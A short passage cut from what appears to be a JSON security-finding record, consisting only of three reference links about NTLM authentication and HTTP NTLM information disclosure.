https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm https://github.com/AonCyberLabs/Nmap-Scripts/tree/master/NTLM-Info-Disclosure https://blog.gdssecurity.com/labs/2014/2/12/http-ntlm-information-disclosure.html" } ]
